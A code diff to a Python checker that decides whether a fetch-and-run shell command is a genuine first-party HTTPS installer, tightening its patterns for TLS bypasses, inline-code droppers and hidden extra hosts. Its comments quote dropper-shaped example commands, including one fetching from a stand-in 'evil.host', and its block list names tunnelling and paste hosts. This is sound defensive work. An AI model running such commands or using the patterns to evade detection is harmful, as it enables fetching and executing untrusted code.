@@ -210,10 +210,18 @@ _DROP_HOST_RE = re.compile(
     r"trycloudflare\.com|loca\.lt|serveo\.net|localhost\.run|discordapp\.(?:com|net)|"
     r"ipfs\.io|dweb\.link|bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|cutt\.ly|rb\.gy|"
     r"gist\.githubusercontent\.com|gist\.github\.com|termbin\.com|dpaste\.\w+)$", re.I)
-# A TLS bypass in any spelling, including a clustered short flag (`-sk`, `-fsSLk`, `-K` config):
-# never part of a first-party installer.
+# A TLS bypass in any spelling, including a clustered short flag (`-sk`, `-fsSLk`) or a config
+# file (`-K`, `--config`) that can carry `insecure`: never part of a first-party installer.
 _INSECURE_FLAG_RE = re.compile(
-    r"(?<![\w-])(?:--insecure|--no-check-certificate|-[A-Za-z]*[kK][A-Za-z]*)(?![\w-])")
+    r"(?<![\w-])(?:--insecure|--no-check-certificate|--config(?:=\S+)?|-[A-Za-z]*[kK][A-Za-z]*)"
+    r"(?![\w-])")
+# An interpreter running inline code as the consumer (`| python -c 'exec(open(0).read())'`) is a
+# dropper shape; vendor installers pipe into a shell or into `python3 -`.
+_INLINE_CODE_CONSUMER_RE = re.compile(
+    r"\b(?:python[0-9.]*|perl|ruby|node|php)\b[^|;&\n]{0,40}?\s-[A-Za-z]*[ce]\b")
+# A schemeless host among the fetch operands (`curl -H 'X: https://vendor/install.sh'
+# evil.host/p`) means the counted URL is not what is fetched.
+_BARE_HOST_RE = re.compile(r"^(?:[a-z0-9-]+\.)+[a-z]{2,}(?::\d+)?(?:/\S*)?$", re.I)
 # Any URL scheme, for counting. The idiom is exactly ONE URL, the fetch operand: a header value,
 # a docs link on the same line or a second command each add a URL and disqualify the shape.
 _ANY_URL_RE = re.compile(r"[a-z][a-z0-9+.-]*://[^\s'\"|;&`)<>]+", re.I)
@@ -229,33 +237,45 @@ _PLACEHOLDER_HOST_RE = re.compile(
 
 
 def _fetch_text(text):
-    """The fetch command up to the first unquoted pipe, quotes removed; None if it will not
-    tokenize (an unbalanced quote), which the caller treats as not a first-party installer."""
-    lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
-    lexer.whitespace_split = True
-    try:
-        tokens = list(lexer)
-    except ValueError:
-        return None
-    fetch = []
-    for token in tokens:
-        if token.startswith("|"):
-            break
-        fetch.append(token)
-    return " ".join(fetch)
+    """The fetch command up to the first pipe that is neither quoted nor escaped, quotes kept;
+    None when a quote is left open, which the caller treats as not a first-party installer."""
+    quote = None
+    i = 0
+    while i < len(text):
+        ch = text[i]
+        if ch == "\\" and quote != "'":
+            i += 2
+            continue
+        if quote is None and ch in "'\"":
+            quote = ch
+        elif ch == quote:
+            quote = None
+        elif quote is None and ch == "|":
+            return text[:i]
+        i += 1
+    return None if quote else text
 
 
 def installer_idiom(command_text) -> bool:
     """True when a fetch-and-run command is a first-party HTTPS installer, see above."""
     text = command_text or ""
-    if _INSECURE_FLAG_RE.search(text):
-        return False
     fetch = _fetch_text(text)
-    if fetch is None or _SUBSTITUTION_RE.search(fetch):
+    if fetch is None or _INSECURE_FLAG_RE.search(fetch) or _SUBSTITUTION_RE.search(fetch):
+        return False
+    if _INLINE_CODE_CONSUMER_RE.search(text[len(fetch):]):
         return False
     urls = _ANY_URL_RE.findall(text)
     if len(urls) != 1:                                 # header/docs URL or a second command
         return False
+    try:
+        tokens = shlex.split(fetch)
+    except ValueError:
+        return False
+    operands = [t.strip("()<>") for t in tokens[1:] if not t.startswith("-")]
+    if operands.count(urls[0]) != 1:                   # the URL sits inside an option value
+        return False
+    if any(_BARE_HOST_RE.match(t) for t in operands if t != urls[0]):
+        return False                                   # something else is fetched
     match = _INSTALLER_URL_RE.fullmatch(urls[0])      # https only; the host class cannot span
     if match is None:                                  # '@', so `vendor@evil.host` fails here
         return False
